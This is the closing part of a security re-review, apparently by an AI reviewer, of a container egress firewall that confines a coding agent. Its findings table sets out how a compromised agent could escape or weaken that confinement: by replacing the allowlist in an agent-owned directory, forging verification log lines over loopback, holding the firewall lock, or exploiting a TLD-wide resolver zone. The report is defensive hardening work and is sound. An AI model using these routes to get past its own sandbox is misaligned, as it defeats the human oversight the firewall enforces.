| `init-firewall.sh:41` `PROFILE_FILE` (`/etc/cc-egress-profile`) | S2 | 0444 root-owned in a root-owned `/etc` | Sound: `node` can neither write it nor pass a substitute through sudo. |

### Log file used as verification evidence

| Call site | Source (S-label) | Guard | Disposition |
|---|---|---|---|
| `init-firewall.sh:1018` `grep -q "REJECT sni=… " "$SNI_LOG"` | S5 → S6 | Log root-owned 0644 in a 0755 root dir; `O_TRUNC` at every proxy start | Not forgeable by writing the file; forgeable by *causing* the line over loopback — F3. The `orig_dst=` provenance field is present but unused. |

### Config-file interpolation

| Call site | Source (S-label) | Guard | Disposition |
|---|---|---|---|
| `init-firewall.sh:216` `echo "server=/$d/$ns"` | S2 (`$d`), S1 (`$ns`) | Hostname regex at `:212` (rejects `/`, `#`); octet alternation for `$ns` | Grammar still sound; the **semantics** widened — a single label is now a TLD-wide forwarding zone (F2). |
| `init-firewall.sh:936-942` SNI allowlist write | S2, `GITHUB_DNS_ZONES` | `parse_entry` grammar; canonical `,443,` match; `chmod 0444` in a 0755 root dir | Derivation from `GITHUB_DNS_ZONES` removes the drift that produced the dead `.githubassets.com` entry; no new injection surface (the loop's split is newline-based after `tr`). |

---

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | `/usr/local/share` node-owned → agent can replace `cc-egress` and have the firewall install its own allowlist | Critical | B3a, B2 | `Dockerfile:59-61`, `:405-419`; `init-firewall.sh:40` | Medium |
| 2 | Single-label profile entry becomes a whole-TLD resolver zone (fail-safe inverted by the R6 fix) | Medium | B7 | `init-firewall.sh:209-217`, `:127-146` | High |
| 3 | Negative-probe log evidence is forgeable over loopback; redirect rule still unasserted | Medium | B7, B4, B5 | `init-firewall.sh:1010-1022`, `:795`; `cc-sni-proxy.py:183` | Medium |
| 4 | `node` can hold the firewall lock and veto every re-assert | Medium | B6, B3 | `init-firewall.sh:295-308` | High |
| 5 | IPv6 default-deny is best-effort; its absence warns rather than gates | Medium | B4 | `init-firewall.sh:523-550`, `:1027` | Medium |
| 6 | Main-path `iptables`/`ipset` still take no `-w` | Low | B4, B3 | `init-firewall.sh:511-521`, `:537-546` | High |

Carried forward unchanged from R1 and not re-filed here: ECH/multi-SNI (R1-F6), `OPENROUTER_API_KEY` exposure (R1-F7), proxy log readability and unboundedness (R1-F8 — now also F3's evidence channel), proxy as a single choke point (R1-F9), GitHub CIDRs on tcp/22 (R1-F11).

---

## Overall Assessment

The fix wave is competent and mostly lands. R1-F3, R1-F4 and R1-F10 are closed outright; R1-F1 is closed on any kernel with an IPv6 filter table; R1-F2's dangerous interleaving is closed by a correctly-placed lock (after the trap, before any mutation, with `9>&-` on both daemons so no child inherits it); R1-F5 is materially improved. The engineering discipline visible in the diff — guarding the IPv6 block on a usable table rather than on the binary, canonicalising ports at the single producer rather than at each consumer, deriving the SNI zones from `GITHUB_DNS_ZONES` so the two lists cannot drift — is the right shape, and the six new bats cases pin the behaviour.

Three things keep this from being a clean pass. First, F1: the whole enforcement stack reads its policy from a directory whose parent is agent-owned, which means a compromised agent can author the allowlist and then invoke the one privileged command it is allowed to run. That is a complete defeat of the boundary, it predates this range, and my own R1 S2 row asserted the opposite — I got it wrong and am correcting it here. It should be fixed and verified on a built image before the rebuild-and-re-bless. Second, two of the fixes introduce new agent-reachable inputs to the control plane itself: the lock file (F4) and the proxy log (F3). Both fail closed, so neither opens egress, but each converts an unconditional guarantee into one the agent can influence, and F3 specifically re-opens the R1-F5 property against a present attacker. Third, F2 inverted a fail-safe: the grammar alignment that made single labels resolvable also made any single-label entry a TLD-wide forwarding zone, which is the exact tunnel the filtering resolver exists to close.

Every endorsement claim above is either executed in this sandbox or explicitly scoped as read-static, and no guardrail with untested bypass candidates is endorsed. But the review remains static with respect to the live kernel, and the pre-`--bless` live-container check tracked in `docs/working/questions.md` is still outstanding. **No safe-to-merge conclusion is offered:** F1 is Critical and unaddressed, F2 and F3 are within the code paths this wave changed, and the endorsements that matter for the boundary (redirects, guard chains, ipset matching) are still pending execution verification.

---

## Goal-Alignment Note
- **Answered:** yes — re-review of `d53bf6a..2839e59` restricted to `devcontainer-config/`, with per-finding status for all 11 prior findings, the fixes reviewed as new attack surface, and the five named guardrails (flock, PATH pin, IPv6 block, probe log check, canonical-port grammar) each carrying ≥3 enumerated bypass candidates. Report at `docs/reviews/security-review-2026-09-03-egress-hardening-r2.md`. Three claims were verified by execution (port canonicalisation, single-label resolver line, flock-on-read-only-fd); the rest are read-static and marked so.
- **Out of scope:** `test/*.bats`, `docs/reviews/*`, `docs/decisions/log.md`, `docs/working/questions.md`, `guides/cc-isolated-usage.md` — read as committed context only. Fact-check residues E4 (`DISABLE_GROWTHBOOK` sourcing), Claim 31 (the flock comment naming one interleaving of a broader class) and Claim 1a's static-only lock verification are author/orchestrator matters and were not adjudicated; I note only that Claim 31's imprecision is harmless because the fix covers the whole class, and that Claim 1a's gap is now partly closed by the executed lock semantics above.
- **Escalate:** (a) **F1 before the rebuild and re-bless** — `chown -R root:root /usr/local/share` (keeping `npm-global` node-owned) plus a root-ownership assertion on `EGRESS_DIR` in the script; verify with `ls -ld` on the built image. Every other control in this range is downstream of it. (b) F2 is a one-line grammar decision (tighten `parse_entry` vs. keep the widened resolver regex) and should not ship as-is with `com`-shaped entries admissible. (c) F3's `orig_dst=` scoping and the missing `iptables -t nat -C` assertion are both cheap and close the last of R1-F5. (d) The live-container check (questions.md, decision-log #40/#41) remains the gate on converting any redirect/ipset endorsement from read-static to executed; F6's IPv6 `else` branch should be exercised there too.
- **Questions I would have asked:** Is `/usr/local/share` node-ownership load-bearing for anything other than `npm-global` (i.e. does any npm global install write outside `npm-global`)? If not, F1 is a one-word fix. And: is a single-label profile entry a requirement (`localhost:11434` for Ollama), or would `host.docker.internal:11434` cover the same case and let `parse_entry` require two labels?
